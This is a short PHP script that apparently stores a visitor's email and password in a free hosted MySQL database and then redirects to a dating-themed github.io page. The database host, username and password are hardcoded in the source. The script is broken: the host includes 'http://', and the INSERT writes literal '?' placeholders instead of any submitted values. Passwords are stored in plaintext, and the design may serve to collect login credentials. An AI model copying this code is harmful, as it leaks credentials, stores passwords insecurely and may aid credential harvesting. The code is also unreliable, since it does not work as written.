<?php
// Define database connection variables
$servername = "http://sql12.freesqldatabase.com/"; // Replace with your own database host name
$username = "sql12599952"; // Replace with your own database username
$password = "zttT6GSgwr"; // Replace with your own database password
$dbname = "sql12599952"; // Replace with your own database name

// Create database connection
$conn = mysqli_connect($servername, $username, $password, $dbname);

// Check if connection is successful
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}

// Define SQL query to insert data into table
$sql = "INSERT INTO info (Id, email_number, password) VALUES ('0', '?', '?')";

// Execute SQL query
if (mysqli_query($conn, $sql)) {
  header("Location: https://love-ai.github.io/lovebite/couple%20query.html");
  exit();
  
} else {
    echo "Error: " . $sql . "<br>" . mysqli_error($conn);
}

// Close database connection
mysqli_close($conn);
?>
